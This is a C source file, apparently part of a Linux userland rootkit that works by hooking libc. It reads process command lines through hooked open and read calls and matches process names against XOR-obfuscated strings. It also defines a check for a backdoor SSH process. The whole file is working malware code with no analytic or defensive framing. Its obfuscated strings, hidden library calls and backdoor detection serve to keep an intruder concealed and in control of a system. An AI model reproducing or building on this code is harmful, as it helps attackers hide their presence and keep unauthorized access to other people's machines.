#include "../hooks/libdl/libdl.h"

static int open_cmdline(pid_t pid){
	char path[PROCPATH_MAXLEN];
	int fd;
	snprintf(path, sizeof(path), CMDLINE_PATH, pid);
	hook(COPEN);
	fd = (long)call(COPEN, path, 0, 0);
	memset(path, 0, strlen(path));
	return fd;
}

static char *process_info(pid_t pid, int mode){
	char *process_info;
	int fd, c;
	hook(CREAD);
	fd = open_cmdline(pid);
	if(fd < 0){
		process_info = FALLBACK_PROCNAME;
		goto end_processinfo;
	}
	switch(mode){
		case MODE_NAME:
			process_info = (char *)malloc(NAME_MAXLEN);
			c = (long)call(CREAD, fd, process_info, NAME_MAXLEN);
			break;
		case MODE_CMDLINE:
			process_info = (char *)malloc(CMDLINE_MAXLEN);
			c = (long)call(CREAD, fd, process_info, CMDLINE_MAXLEN);
			int i;
			for(i = 0; i < c; i++)
				if(process_info[i] == 0x00)
					process_info[i] = 0x20;
			break;
	}
	close(fd);
end_processinfo:
	return process_info;
}

static int cmp_process(char *name){
	char *myname = process_name();
	int status = strncmp(myname, name, strlen(myname));
	free(myname);
	return !status;
}

static char *str_process(char *name){
	char *myname = process_name(), *status = strstr(name, myname);
	free(myname);
	return status;
}

static int process(char *name){
	if(cmp_process(name))
		return 1;
	if(str_process(name))
		return 1;
	return 0;
}

static int xprocess(const char *name){
	xor(_name, name);
	int ret = process(_name);
	clean(_name);
	return ret;
}

#define bd_sshproc() xprocess(BD_SSHPROCNAME)
